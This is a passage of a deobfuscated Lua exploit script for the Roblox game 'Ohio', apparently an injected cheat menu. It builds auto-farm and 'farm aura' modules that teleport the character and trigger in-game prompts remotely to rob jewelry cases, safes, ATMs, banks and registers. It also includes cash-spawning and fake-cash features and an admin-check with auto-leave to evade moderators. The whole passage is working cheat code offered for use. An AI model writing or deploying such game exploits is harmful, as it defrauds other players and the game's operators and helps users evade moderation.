											local meshPart = FindFirstChildOfClass(v19, "MeshPart")

											if meshPart then
												local descendants = GetDescendants(v19)

												for i2 = 1, #descendants do
													local v20 = descendants[i2]

													if IsA(v20, "ProximityPrompt") and v20.Enabled then
														local v21 = fn69()

														if v21 then
															v21:ChangeState(Enum.HumanoidStateType.Jumping)
														end

														local v22 = fn124(meshPart.CFrame)
														fn79(v22, 0.5)
														fireproximityprompt(v20)
														fn79(v22, 0.2)
														return
													end
												end
											end
										end
									end

									local function fn142()
										local Fists = fn71("Fists")
										local game_ = workspace.Game and FindFirstChild(workspace.Game, "Props")
										local cashRegister = game_ and FindFirstChild(game_, "CashRegister")
										if not cashRegister then
											return
										end
										local children = GetChildren(cashRegister)

										for i = 1, #children do
											local v19 = children[i]
											local guid = GetAttribute(v19, "guid")
											local state_ = GetAttribute(v19, "state")
											local primaryPart = v19.PrimaryPart

											if guid and state_ ~= "destroyed" and primaryPart then
												fn79(fn124(primaryPart.CFrame), 0.2)
												Fists = Fists and Fists.guid
												fn95(Fists, "meleepunch", v19)
												fn79(fn124(primaryPart.CFrame), 0.8)
												return
											end
										end
									end

									local function fn143()
										if not fn71("Lockpick") and not fn86(LocalPlayer) then
											fn92("Lockpick")
											return
										end
										local v19 = fn101()

										for i = 1, #v19 do
											local v20 = v19[i]
											if v20.prompt then
												fn79(fn124(NewCFrame(v20.pos)), 3)
												return
											end
										end
									end

									local tbl37

									tbl37 = {
										ItemCache = {},
										PriceCache = {},
										AttackCooldown = {},
										Cases = nil,
										CasesFolder = nil,
										CasesAt = 0,
										getItemSource = function(arg)
											if not arg then
												return
											end
											local v19 = tbl37.ItemCache[arg]
											if v19 ~= nil then
												return v19 or nil
											end
											local module = nil

											pcall(function()
												local fn144 = nil

												fn144 = function(arg2)
													local v20 = FindFirstChild(arg2, arg)
													if v20 then
														return v20
													end

													for _, v21 in pairs(GetChildren(arg2)) do
														if IsA(v21, "Folder") then
															local v22 = fn144(v21)
															if v22 then
																return v22
															end
														end
													end

													return nil
												end

												for _, v20 in
													pairs(
														GetChildren(ReplicatedStorage.devv.shared.Indicies.v3items.bin)
													)
												do
													if IsA(v20, "Folder") then
														local v21 = fn144(v20)
														if v21 then
															module = require(v21)
															break
														end
													end
												end
											end)

											tbl37.ItemCache[arg] = module or false
											return module
										end,
										getSellPrice = function(arg)
											local v19 = tbl37.PriceCache[arg]
											if v19 ~= nil then
												return v19 or nil
											end
											local v20 = tbl37.getItemSource(arg)
											local num = tonumber(v20 and v20.sellPrice)
											tbl37.PriceCache[arg] = num or false
											return num
										end,
										getCases = function()
											local gemRobbery = FindFirstChild(workspace, "GemRobbery")

											local jewelryCases = gemRobbery
												and FindFirstChild(gemRobbery, "JewelryCases")

											if not jewelryCases then
												tbl37.Cases = nil
												tbl37.CasesFolder = nil
												return {}
											end

											local flag4 = tbl37.CasesFolder ~= jewelryCases or not tbl37.Cases

											if not flag4 then
												local casesAt = tbl37.CasesAt
												flag4 = tick() - casesAt >= 0.25
											end

											if flag4 then
												local cases = {}
												local descendants = GetDescendants(jewelryCases)

												for i = 1, #descendants do
													local v19 = descendants[i]

													if IsA(v19, "Model") and v19.Name == "JewelryCase" then
														Insert(cases, #cases + 1, v19)
													end
												end

												tbl37.Cases = cases
												tbl37.CasesFolder = jewelryCases
												tbl37.CasesAt = tick()
											end

											return tbl37.Cases
										end,
										getStealPrompts = function(arg)
											local tbl38 = {}
											local descendants = GetDescendants(arg)

											for i = 1, #descendants do
												local v19 = descendants[i]

												if IsA(v19, "ProximityPrompt") and v19.ActionText == "Steal" then
													local parent = v19.Parent

													while parent and parent ~= arg and not IsA(parent, "Model") do
														parent = parent.Parent
													end

													if parent and parent ~= arg and IsA(parent, "Model") then
														local parent2 = v19.Parent

														while
															parent2
															and parent2 ~= parent
															and not IsA(parent2, "BasePart")
														do
															parent2 = parent2.Parent
														end

														if not parent2 or not IsA(parent2, "BasePart") then
															parent2 = FindFirstChildWhichIsA(parent, "BasePart", true)
														end

														Insert(
															tbl38,
															#tbl38 + 1,
															{ model = parent, prompt = v19, part = parent2 }
														)
													end
												end
											end

											return tbl38
										end,
										attack = function(arg, arg2)
											if not arg2 or not arg2.CanCollide then
												return false
											end
											local now = tick()
											if now - (tbl37.AttackCooldown[arg] or 0) < 0.25 then
												return false
											end
											local Fists = fn71("Fists")
											local v19 = fn95(Fists and Fists.guid, "meleepunch", arg2)

											if v19 then
												tbl37.AttackCooldown[arg] = now
											end

											return v19
										end,
										runFarmAura = function(arg)
											if flag3 then
												return
											end
											local v19 = tbl37.getCases()

											for i = 1, #v19 do
												local v20 = v19[i]
												local glass = FindFirstChild(v20, "Glass")

												if
													glass
													and IsA(glass, "BasePart")
													and (arg.Position - glass.Position).Magnitude <= 30
												then
													if glass.CanCollide then
														tbl37.attack(v20, glass)
													end

													local v21 = tbl37.getStealPrompts(v20)

													for i2 = 1, #v21 do
														local v22 = v21[i2]

														if
															v22.prompt.Enabled
															and (arg.Position - (v22.part or glass).Position).Magnitude
																<= 30
														then
															fireproximityprompt(v22.prompt)
														end
													end
												end
											end
										end,
										runAutoFarmHighValue = function()
											local tbl38 = {}
											local v19 = fn70()
											local v20 = tbl37.getCases()

											for i = 1, #v20 do
												local v21 = v20[i]
												local glass = FindFirstChild(v21, "Glass")

												if glass and IsA(glass, "BasePart") then
													local v22 = tbl37.getStealPrompts(v21)

													for i2 = 1, #v22 do
														local v23 = v22[i2]
														local v24 = tbl37.getSellPrice(v23.model.Name)

														if v24 and v24 >= tbl30.AutoFarm.MinPrice then
															local part = v23.part or glass

															Insert(tbl38, #tbl38 + 1, {
																case = v21,
																glass = glass,
																prompt = v23.prompt,
																part = part,
																price = v24,
																distance = v19
																		and (v19.Position - part.Position).Magnitude
																	or math.huge,
															})
														end
													end
												end
											end

											if #tbl38 == 0 then
												return false
											end

											table.sort(tbl38, function(arg, arg2)
												if arg.price == arg2.price then
													return arg.distance < arg2.distance
												end
												return arg.price > arg2.price
											end)

											if flag3 then
												return true
											end
											local v21 = tbl38[1]
											fn79(fn124(v21.part.CFrame), 0.15)
											if flag3 then
												return true
											end

											if v21.glass.CanCollide then
												fn79(fn124(v21.glass.CFrame), 0.15)

												if not flag3 then
													tbl37.attack(v21.case, v21.glass)
												end
											elseif v21.prompt.Enabled then
												fireproximityprompt(v21.prompt)
											end

											return true
										end,
										runAutoFarmRefresh = function()
											if flag3 then
												return
											end
											local v19 = fn70()
											if not v19 then
												return
											end
											local v20 = tbl37.getCases()
											local v21 = nil
											local v22 = nil
											local v23

											for i = 1, #v20 do
												local v24 = v20[i]
												local glass = FindFirstChild(v24, "Glass")

												if glass and IsA(glass, "BasePart") and glass.CanCollide then
													local magnitude = (v19.Position - glass.Position).Magnitude

													if not v21 or magnitude < v21 then
														v21 = magnitude
														v22 = v24
														v23 = glass
													end
												end
											end

											if v22 and v23 then
												fn79(fn124(v23.CFrame), 0.15)

												if not flag3 then
													tbl37.attack(v22, v23)
												end
											end
										end,
									}

									local function fn144()
										local H, m = D[1](), FindFirstChild(workspace, "Game")
										if not H or not m then
											return
										end
										local h = D[2].FarmAura.Options

										if D[3](h, "Item") then
											local B = D[4]()

											for t = 1, #B, 1 do
												local x = B[t].PrimaryPart

												if x and (H.Position - x.Position).Magnitude <= 30 then
													D[5](x)
												end
											end
										end

										if D[3](h, "JewelryCase") then
											D[6].runFarmAura(H)
										end

										if D[3](h, "Cash") then
											local B = FindFirstChild(m, "Entities")
											local t = B and (FindFirstChild(B, "CashBundle"))

											if t then
												B = GetChildren(t)

												for t = 1, #B, 1 do
													local x = B[t]

													local B, t =
														FindFirstChildOfClass(x, "Part") or x.PrimaryPart,
														FindFirstChildOfClass(x, "ClickDetector")

													if B and t and (H.Position - B.Position).Magnitude <= 30 then
														fireclickdetector(t)
													end
												end
											end

											if GetAttribute(LocalPlayer, "bankCash") ~= 0 then
												for B = 1, 5, 1 do
													FireServer("steaӏBankCash")
												end
											end
										end

										if D[3](h, "Safe") then
											if D[3](h, "LockPick") then
												if not D[7]("Lockpick") and not D[8](LocalPlayer) then
													D[9]("Lockpick")
												end
											end

											local B = FindFirstChild(m, "Entities")

											if B then
												local t = tick()

												if luraph_box(D[10]) ~= B or t - luraph_box(D[11]) >= D[12] then
													local __boxv0, __boxv1, __boxv2 = GetDescendants(B), t, B
													luraph_box_set(D[13], __boxv0)
													luraph_box_set(D[11], __boxv1)
													luraph_box_set(D[10], __boxv2)
												end

												t = luraph_box(D[13])

												for B = 1, #t, 1 do
													local x = t[B]

													if IsA(x, "ProximityPrompt") and x.Enabled and (D[14](x)) then
														B = x.Parent
														B = if B and not IsA(B, "BasePart") then B.Parent else B

														if
															B
															and (IsA(B, "BasePart"))
															and (H.Position - B.Position).Magnitude <= 30
														then
															fireproximityprompt(x)
														end
													end
												end
											end
										end

										if D[3](h, "ATM") then
											D[15]()
										end

										if D[3](h, "Airdrop") then
											local B = FindFirstChild(m, "Airdrops")

											if B then
												local t = GetChildren(B)

												for B = 1, #t, 1 do
													local x = t[B]
													B = FindFirstChildOfClass(x, "MeshPart") or x.PrimaryPart

													if B and (H.Position - B.Position).Magnitude <= 30 then
														local B = GetDescendants(x)

														for t = 1, #B, 1 do
															local x = B[t]

															if IsA(x, "ProximityPrompt") and x.Enabled then
																fireproximityprompt(x)
															end
														end
													end
												end
											end
										end

										if D[3](h, "Work") or (D[3](h, "Job")) then
											local B = FindFirstChild(m, "Local")
											local t = B and (FindFirstChild(B, "Rubbish"))

											if t then
												B = GetChildren(t)

												for t = 1, #B, 1 do
													local x = B[t]

													t = x.PrimaryPart
														and (FindFirstChildOfClass(x.PrimaryPart, "ClickDetector"))

													if t then
														fireclickdetector(t)
													end
												end
											end
										end

										if D[3](h, "Cash Register") then
											local B = FindFirstChild(m, "Props")
											local t = B and (FindFirstChild(B, "CashRegister"))

											if t then
												B = GetChildren(t)

												for t = 1, #B, 1 do
													local x = B[t]
													t = x.PrimaryPart

													if
														t
														and (GetAttribute(x, "health") or 0) > 0
														and (H.Position - t.Position).Magnitude < 20
													then
														local H = D[7]("Fists")
														D[16](H and H.guid, "meleepunch", x)
													end
												end
											end
										end

										if D[3](h, "Vehicle") then
											m = D[17]()[1]

											if m and m.dist <= 15 and m.prompt then
												fireproximityprompt(m.prompt)
											end
										end

										if D[3](h, "Halloween") then
											D[18](FindFirstChild(workspace, "Halloween"))
										end

										if D[3](h, "Christmas") then
											D[18](FindFirstChild(workspace, "Christmas"))
										end
									end

									local function fn145()
										pcall(task.cancel, thread)
										thread = nil
										if not tbl30.FarmAura.Enabled then
											return
										end

										thread = Spawn(function()
											while tbl30.FarmAura.Enabled do
												pcall(fn144)
												Wait(0.03)
											end
										end)
									end

									local function fn146(arg)
										if arg then
											arg = arg.PrimaryPart or FindFirstChildWhichIsA(arg, "BasePart")
										end

										return arg
									end

									local function fn147(arg, arg2)
										if not arg then
											return false
										end
										local v19 = tbl37.getItemSource(arg)
										if not v19 then
											return false
										end

										if fn103(tbl30.AutoFarm.Tasks, "Permanent Item") then
											if arg == "Military Armory Keycard" or arg == "Police Armory Keycard" then
												return not fn72(arg)
											end

											if v19 and v19.permanent then
												return true, "Permanent Item"
											end
										end

										if fn103(tbl30.AutoFarm.Tasks, "Price Item") then
											local sellPrice = v19 and v19.sellPrice
											local num = tonumber(sellPrice)

											if num then
												local minPrice = tbl30.AutoFarm.MinPrice
												num = tonumber(sellPrice) >= minPrice
											end

											if num then
												return fn80(fn146(arg2)), "Price Item"
											end
										end

										if
											fn103(tbl30.AutoFarm.Tasks, "Cash") and (arg == "Cash" or arg == "Money")
										then
											local n13 = arg2 and FindFirstChild(arg2, "Cash") and arg2.Cash.Value or 0
											local flag4 = tonumber(n13) == nil

											if not flag4 then
												local minCash = tbl30.AutoFarm.MinCash
												flag4 = tonumber(n13) >= minCash
											end

											return flag4, "Cash"
										end

										if fn103(tbl30.AutoFarm.Tasks, "Present") and arg:find("Present") then
											return true, "Present"
										end

										if fn103(tbl30.AutoFarm.Tasks, "Luck Block") and arg:find("Lucky") then
											return true, "Luck Block"
										end

										if fn103(tbl30.AutoFarm.Tasks, "Component Box") and arg == "Component Box" then
											return true, "Component Box"
										end

										if
											fn103(tbl30.AutoFarm.Tasks, "Stash Gem")
											and v19
											and (v19.subtype == "gem" or v19.subtype == "valuable")
										then
											return (tonumber(v19 and v19.sellPrice) or 0)
												>= tbl30.AutoFarm.MinStashPrice,
												"Stash Gem"
										end

										return false, "Stash Gem"
									end

									local function fn148(arg)
										local v19 = fn146(arg)
										if not v19 then
											return
										end
										local v20 = fn70()
										local v21 = fn69()
										if not v20 or not v21 then
											return
										end

										if not fn80(v19) then
											return
										end

										if not fn81(v19) then
											return
										end
										local cFrame = v20.CFrame
										v21:ChangeState(Enum.HumanoidStateType.Jumping)
										v20.CFrame = v19.CFrame * NewCFrame(0, -4, 0)
										v20.AssemblyLinearVelocity = EmptyVector3

										for i = 1, 3 do
											fn104(v19)
											Wait(0.1)
										end

										if v20 and v20.Parent then
											v20.CFrame = cFrame
											v20.AssemblyLinearVelocity = EmptyVector3
										end
									end

									local function fn149()
										if not fn123() then
											return
										end

										if not FindFirstChild(workspace, "Game") or not fn70() then
											return
										end
										fn127()
										fn128()
										fn129()

										if
											fn103(tbl30.AutoFarm.Tasks, "Item")
											or fn103(tbl30.AutoFarm.Tasks, "Permanent Item")
											or fn103(tbl30.AutoFarm.Tasks, "Price Item")
											or fn103(tbl30.AutoFarm.Tasks, "Cash")
											or fn103(tbl30.AutoFarm.Tasks, "Present")
											or fn103(tbl30.AutoFarm.Tasks, "Luck Block")
											or fn103(tbl30.AutoFarm.Tasks, "Component Box")
											or fn103(tbl30.AutoFarm.Tasks, "Stash Gem")
										then
											local v19 = fn102()

											for i = 1, #v19 do
												local v20 = v19[i]

												if fn147(GetAttribute(v20, "itemName"), v20) then
													local v21 = fn146(v20)
													if fn80(v21) then
														fn148(v20)
														break
													end
												end
											end
										end

										local flag4 = false

										if fn103(tbl30.AutoFarm.Tasks, "JewelryCase") then
											flag4 = tbl37.runAutoFarmHighValue()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Stash Gem") then
											fn134()
										end

										if fn103(tbl30.AutoFarm.Tasks, "ATM") then
											fn131()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Safe") then
											fn132()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Money Printer") then
											fn137()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Bank") then
											fn130()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Treasure") then
											fn138()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Spin") then
											fn139()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Cash Register") then
											fn142()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Airdrop") then
											fn141()
										end

										if fn103(tbl30.AutoFarm.Tasks, "Vehicle") then
											fn143()
										end

										if fn103(tbl30.AutoFarm.Tasks, "JewelryCase") and not flag4 then
											tbl37.runAutoFarmRefresh()
										end

										if
											fn103(tbl30.AutoFarm.Tasks, "Job") or fn103(tbl30.AutoFarm.Tasks, "Work")
										then
											fn140()
										else
											fn79(
												NewCFrame(
													NewVector3(
														1598.2271728515625,
														-39.155593872070312,
														-250.66340637207031
													)
												),
												0.01
											)
										end
									end

									local tbl38 = {}
									local str3 = "RollieCraft"
									local n13 = 35
									local n14 = 5
									local n15 = 0
									local thread7 = nil

									local function fn150()
										return (GetAttribute(LocalPlayer, "component_refinedMetal") or 0) >= n13
									end

									local function fn151(arg)
										if not arg then
											return false
										end

										if GetAttribute(LocalPlayer, "currentCraft") then
											return false
										end

										if tick() - n15 < n14 then
											return false
										end
										local ok4, result4 = pcall(InvokeServer, "beginCraft", arg)
										if ok4 and result4 then
											n15 = tick()
											return true
										end
										return false
									end

									local function fn152()
										local localPlayer = LocalPlayer
										if GetAttribute(localPlayer, "currentCraft") ~= str3 then
											return false
										end

										if GetAttribute(localPlayer, "currentCraftClaimed") then
											return false
										end

										local craftCompletionTime = GetAttribute(localPlayer, "craftCompletionTime")
											or 0

										if craftCompletionTime == 0 or os.time() <= craftCompletionTime then
											return false
										end
										local ok4, result4 = pcall(InvokeServer, "claimCraft")
										return ok4 and result4
									end

									local function fn153()
										pcall(task.cancel, thread7)
										thread7 = nil
										if
											not (tbl30.AutoFarm.Enabled and fn103(tbl30.AutoFarm.Tasks, "Craft Rollie"))
										then
											return
										end

										thread7 = Spawn(function()
											while
												tbl30.AutoFarm.Enabled and fn103(tbl30.AutoFarm.Tasks, "Craft Rollie")
											do
												local ok4, result4 = pcall(function()
													local localPlayer = LocalPlayer

													if GetAttribute(localPlayer, "currentCraft") == str3 then
														fn152()
													elseif
														not GetAttribute(localPlayer, "currentCraft") and fn150()
													then
														fn151("RollieCraft")
													end
												end)

												if not ok4 then
													warn("[OhioCraftRollie] " .. tostring(result4))
												end

												Wait(5)
											end
										end)
									end

									local function fn154()
										pcall(task.cancel, thread2)
										thread2 = nil
										pcall(task.cancel, thread7)
										thread7 = nil
										if not tbl30.AutoFarm.Enabled then
											return
										end

										thread2 = Spawn(function()
											while tbl30.AutoFarm.Enabled do
												local ok4, result4 = pcall(fn149)

												if not ok4 then
													warn("[OhioAutoFarm] " .. tostring(result4))
												end

												Wait(0.1)
											end
										end)

										Spawn(function()
											while tbl30.AutoFarm.Enabled and Wait() do
												if fn103(tbl30.AutoFarm.Tasks, "Permanent Item") then
													local v19 = fn102()

													for i = 1, #v19 do
														flag3 = true
														local v20 = v19[i]
														local itemName = GetAttribute(v20, "itemName")

														if not (not itemName or tbl38[itemName]) then
															local v21, v22 = fn147(itemName, v20)

															if v21 and v22 == "Permanent Item" then
																local v23 = fn146(v20)
																if fn80(v23) then
																	fn148(v20)
																	break
																end
															else
																tbl38[itemName] = true
															end
														end
													end
												end

												flag3 = false
											end
										end)

										fn153()
									end

									local function fn155()
										pcall(task.cancel, thread3)
										thread3 = nil
										if not fn116() then
											return
										end

										thread3 = Spawn(function()
											while fn116() do
												pcall(function()
													local v19 = pairs
													local items = inventory.items or {}

													for _, item in v19(items) do
														if
															item
															and item.guid
															and item.name
															and not item.isStashed
															and item.name ~= "Treasure Map"
														then
															local useIgnore = tbl30.AutoSell.UseIgnore
																and fn103(tbl30.AutoSell.Ignore, item.name)

															if
																tbl30.AutoSell.Enabled
																and tick() - n7 >= 60
																and not tbl10[item.guid]
															then
																if
																	item.sellPrice
																	and item.sellPrice <= tbl30.AutoSell.Max
																	and not useIgnore
																then
																	fn75(item.guid)
																	FireServer("sellItem", item.guid)
																end
															end

															if tbl30.AutoUse and tbl34[item.name] then
																fn75(item.guid)
																FireServer("useConsumable", item.guid)
																fn76(item.guid)
															end

															if
																(tbl30.AutoRemove or tbl30.AutoDisassemble)
																and (
																	tbl35[item.name]
																	or (item.name == "Candy Cane" and 1 or 0) > 1
																)
															then
																if tbl30.AutoDisassemble then
																	InvokeServer(
																		"craftingDisassemble",
																		{ [item.guid] = 1 }
																	)
																end

																if tbl30.AutoRemove then
																	fn76(item.guid)
																end
															end
														end
													end
												end)

												Wait(0.35)
											end
										end)
									end

									local function fn156()
										pcall(task.cancel, thread6)
										thread6 = nil
										if not tbl30.AutoDumbell then
											return
										end

										thread6 = Spawn(function()
											while tbl30.AutoDumbell do
												if fn68() and not fn86(LocalPlayer) then
													local Dumbell = fn71("Dumbell")

													if Dumbell then
														fn75(Dumbell.guid)
														FireServer("liftDumbell")
													else
														fn92("Dumbell")
													end
												end

												Wait(0.2)
											end
										end)
									end

									ohioFarm
										:CreateModule({
											Id = "ohio-farm-admin-check",
											Name = "Admin Check",
											Default = tbl30.AdminCheck,
											Callback = function(adminCheck)
												tbl30.AdminCheck = adminCheck
												fn119()
											end,
										})
										:CreateToggle({
											Id = "ohio-farm-auto-leave",
											Name = "Auto Leave",
											Default = tbl30.AutoLeave,
											Callback = function(autoLeave)
												tbl30.AutoLeave = autoLeave
											end,
										})

									ohioFarm:CreateModule({
										Id = "ohio-farm-auto-rewards",
										Name = "Auto Rewards",
										Default = tbl30.AutoRewards,
										Callback = function(autoRewards)
											tbl30.AutoRewards = autoRewards
											fn121()
										end,
									})

									ohioFarm
										:CreateModule({
											Id = "ohio-farm-auto-mask",
											Name = "Auto Mask",
											Default = tbl30.AutoMask.Enabled,
											Callback = function(enabled)
												tbl30.AutoMask.Enabled = enabled
												fn122()
											end,
										})
										:CreateSelector({
											Id = "ohio-farm-mask",
											Name = "Mask",
											Options = {
												{ Value = "Hockey Mask" },
												{ Value = "Surgeon Mask" },
												{ Value = "Black Bandana" },
												{ Value = "Blue Bandana" },
												{ Value = "Red Bandana" },
											},
											Default = tbl30.AutoMask.Mask,
											Callback = function(mask)
												tbl30.AutoMask.Mask = mask
											end,
										})

									local farmAura = ohioFarm:CreateModule({
										Id = "ohio-farm-aura",
										Name = "Farm Aura",
										Default = tbl30.FarmAura.Enabled,
										Callback = function(enabled)
											tbl30.FarmAura.Enabled = enabled
											fn145()
										end,
									})

									local tbl39 = {
										"LockPick",
										"Item",
										"JewelryCase",
										"Cash",
										"Safe",
										"ATM",
										"Airdrop",
										"Work",
										"Cash Register",
										"Vehicle",
										"Job",
									}

									for i = 1, #tbl39 do
										local v19 = tbl39[i]
										local str4 = v19:lower():gsub("[^%w]+", "_")

										farmAura:CreateToggle({
											Id = "ohio-farm-aura-" .. str4,
											Name = v19,
											NameKey = "ohio_farm_aura_" .. str4,
											Default = fn103(tbl30.FarmAura.Options, v19),
											Callback = function(arg)
												fn113(tbl30.FarmAura.Options, v19, arg)
											end,
										})
									end

									local autoFarm = ohioFarm:CreateModule({
										Id = "ohio-farm-auto-farm",
										Name = "Auto Farm",
										Default = tbl30.AutoFarm.Enabled,
										Callback = function(enabled)
											tbl30.AutoFarm.Enabled = enabled
											fn154()
										end,
									})

									autoFarm:CreateSlider({
										Id = "ohio-farm-min-stash-price",
										Name = "Min Stash Price",
										Min = 20,
										Max = 20000,
										Default = tbl30.AutoFarm.MinStashPrice,
										Step = 1,
										Callback = function(minStashPrice)
											tbl30.AutoFarm.MinStashPrice = minStashPrice
										end,
									})

									autoFarm:CreateSlider({
										Id = "ohio-farm-min-price",
										Name = "Min Farm Price",
										Min = 20,
										Max = 20000,
										Default = tbl30.AutoFarm.MinPrice,
										Step = 1,
										Callback = function(minPrice)
											tbl30.AutoFarm.MinPrice = minPrice
										end,
									})

									autoFarm:CreateSlider({
										Id = "ohio-farm-min-cash",
										Name = "Min Farm Cash",
										Min = 20,
										Max = 20000,
										Default = tbl30.AutoFarm.MinCash,
										Step = 1,
										Callback = function(minCash)
											tbl30.AutoFarm.MinCash = minCash
										end,
									})

									local tbl40 = {
										"Stash Gem",
										"Permanent Item",
										"JewelryCase",
										"Money Printer",
										"Treasure",
										"Bank",
										"Bomb Robbery",
										"Cash",
										"Airdrop",
										"Price Item",
										"Safe",
										"Vehicle",
										"ATM",
										"Cash Register",
										"Present",
										"Luck Block",
										"Spin",
										"Component Box",
										"Craft Rollie",
										"Job",
									}

									for i = 1, #tbl40 do
										local v19 = tbl40[i]
										local str4 = v19:lower():gsub("[^%w]+", "_")

										autoFarm:CreateToggle({
											Id = "ohio-farm-task-" .. str4,
											Name = v19,
											NameKey = "farm_task_" .. str4,
											Default = fn103(tbl30.AutoFarm.Tasks, v19),
											Callback = function(arg)
												fn113(tbl30.AutoFarm.Tasks, v19, arg)

												if v19 == "Craft Rollie" then
													fn153()
												end
											end,
										})
									end

									local autoSell = ohioFarm:CreateModule({
										Id = "ohio-farm-auto-sell",
										Name = "Auto Sell",
										Default = tbl30.AutoSell.Enabled,
										Callback = function(enabled)
											tbl30.AutoSell.Enabled = enabled
											fn155()
										end,
									})

									autoSell:CreateToggle({
										Id = "ohio-farm-use-ignore",
										Name = "Use Ignore",
										Default = tbl30.AutoSell.UseIgnore,
										Callback = function(useIgnore)
											tbl30.AutoSell.UseIgnore = useIgnore
										end,
									})

									autoSell:CreateSlider({
										Id = "ohio-farm-max-sell",
										Name = "Max Sell",
										Min = 20,
										Max = 20000,
										Default = tbl30.AutoSell.Max,
										Step = 1,
										Callback = function(max)
											tbl30.AutoSell.Max = max
										end,
									})

									local tbl41 = {
										"AS Val",
										"AUG",
										"AWP",
										"Barrett M107",
										"FN FAL",
										"M1 Garand",
										"M249 SAW",
										"P90",
										"Scar L",
										"Raygun",
										"RPG",
										"Treasure Map",
										"Fire Extinguisher",
									}

									for i = 1, #tbl41 do
										local v19 = tbl41[i]
										local str4 = v19:lower():gsub("[^%w]+", "_")

										autoSell:CreateToggle({
											Id = "ohio-farm-sell-ignore-" .. str4,
											Name = v19,
											NameKey = "ohio_farm_auto_sell_ignore_" .. str4,
											Default = fn103(tbl30.AutoSell.Ignore, v19),
											Callback = function(arg)
												fn113(tbl30.AutoSell.Ignore, v19, arg)
											end,
										})
									end

									ohioFarm:CreateModule({
										Id = "ohio-farm-auto-use",
										Name = "Auto Use",
										Default = tbl30.AutoUse,
										Callback = function(autoUse)
											tbl30.AutoUse = autoUse
											fn155()
										end,
									})

									ohioFarm:CreateModule({
										Id = "ohio-farm-auto-disassemble",
										Name = "Auto Disassemble",
										Default = tbl30.AutoDisassemble,
										Callback = function(autoDisassemble)
											tbl30.AutoDisassemble = autoDisassemble
											fn155()
										end,
									})

									ohioFarm:CreateModule({
										Id = "ohio-farm-auto-remove",
										Name = "Auto Remove",
										Default = tbl30.AutoRemove,
										Callback = function(autoRemove)
											tbl30.AutoRemove = autoRemove
											fn155()
										end,
									})

									ohioFarm:CreateModule({
										Id = "ohio-farm-auto-dumbell",
										Name = "Auto Dumbell",
										Default = tbl30.AutoDumbell,
										Callback = function(autoDumbell)
											tbl30.AutoDumbell = autoDumbell
											fn156()
										end,
									})
								end

								fn114()
								local ohioMisc = window:CreateTab({ Id = "ohio-misc", Name = "Ohio Misc" })

								local function fn115()
									local tbl30 = {
										JoinPlr = "",
										NoCameraShake = true,
										BlockVFX = {},
										SpawnCash = 10000,
										FakeCash = { Enabled = false, Cash = 9178666 },
										FakeWallet = "None",
										FakeBalloon = "None",
										Beautify = {
											Enabled = false,
											BalloonTarget = nil,
											Kunai = false,
											CandyCane = false,
											Scythe = false,
										},
										GetGun = {},
										GetBalloon = {},
										GetKunai = {},
									}

									local function fn116(arg)
										local tbl31 = { "None" }
										arg = arg or {}

										for i = 1, #arg do
											Insert(tbl31, arg[i])
										end

										return tbl31
									end

									local function fn117(arg)
										if arg then
											CameraShaker.new = function()
												return setmetatable({}, {
													__index = function()
														return function() end
													end,
												})
											end
										else
											CameraShaker.new = new
										end
									end

									fn117(tbl30.NoCameraShake)

									ohioMisc:CreateModule({
										Id = "ohio-misc-anti-sticky-lag",
										Name = "Anti Sticky Lag",
										Default = true,
										Callback = function(arg)
											if not arg then
												pcall(function()
													workspace.Game.Local.stickymodded.Name = "sticky"
												end)

												return
											end

											pcall(function()
												workspace.Game.Local.sticky.Name = "stickymodded"
											end)
										end,
									})

									ohioMisc
										:CreateModule({ Id = "ohio-misc-join-server", Name = "Join Server" })
										:CreateButton({
											Id = "ohio-misc-join-vc-server",
											Name = "VC Server",
											Callback = function()
												FireServer("teleportVC")
											end,
										})

									local joinPlayer =
										ohioMisc:CreateModule({ Id = "ohio-misc-join-player", Name = "Join Player" })

									joinPlayer:CreateInput({
										Id = "ohio-misc-join-plr-input",
										Name = "Player Name/ID",
										Default = tbl30.JoinPlr,
										Placeholder = "UserName/UserId",
										Callback = function(arg)
											local flag4 = typeof(arg) == "string" and arg
											local str3

											if flag4 then
												str3 = flag4
											else
												str3 = tostring(arg or "")
											end

											tbl30.JoinPlr = string.gsub(string.gsub(str3, "^%s+", ""), "%s+$", "")
										end,
									})

									joinPlayer:CreateButton({
										Id = "ohio-misc-join-plr-btn",
										Name = "Join",
										Callback = function()
											local joinPlr = tbl30.JoinPlr
											if not joinPlr or joinPlr == "" then
												return
											end
											local num = tonumber(joinPlr)

											if not num then
												local ok4, result4 = pcall(function()
													return Players:GetUserIdFromNameAsync(joinPlr)
												end)

												if ok4 then
													num = result4
												end
											end

											if num then
												FireServer("joinServer", num)
											end
										end,
									})

									ohioMisc:CreateModule({
										Id = "ohio-misc-no-camera-shake",
										Name = "No Camera Shake",
										Default = tbl30.NoCameraShake,
										Callback = function(noCameraShake)
											tbl30.NoCameraShake = noCameraShake
											fn117(noCameraShake)
										end,
									})

									local blockVfx =
										ohioMisc:CreateModule({ Id = "ohio-misc-block-vfx", Name = "Block VFX" })

									for i = 1, #tbl12 do
										local v18 = tbl12[i]
										local str3 = v18:lower():gsub("[^%w]+", "_")

										blockVfx:CreateToggle({
											Id = "ohio-misc-block-vfx-" .. str3,
											Name = v18,
											NameKey = "ohio_misc_block_vfx_" .. str3,
											Default = fn103(tbl30.BlockVFX, v18),
											Callback = function(arg)
												fn113(tbl30.BlockVFX, v18, arg)
												tbl26 = fn82(tbl30.BlockVFX)
											end,
										})
									end

									local spawnCash =
										ohioMisc:CreateModule({ Id = "ohio-misc-spawn-cash", Name = "Spawn Cash" })

									spawnCash:CreateInput({
										Id = "ohio-misc-spawn-cash-input",
										Name = "Amount",
										Default = tbl30.SpawnCash,
										Placeholder = "Number",
										Callback = function(arg)
											tbl30.SpawnCash = tonumber(arg) or tbl30.SpawnCash
										end,
									})

									spawnCash:CreateButton({
										Id = "ohio-misc-spawn-cash-btn",
										Name = "Spawn",
										Callback = function()
											fn87(tbl30.SpawnCash)
										end,
									})

									ohioMisc
										:CreateModule({
											Id = "ohio-misc-fake-cash",
											Name = "Fake Cash",
											Callback = function(enabled)
												tbl30.FakeCash.Enabled = enabled
												pcall(task.cancel, ohioFakeMoneyTask)
												ohioFakeMoneyTask = nil

												if enabled then
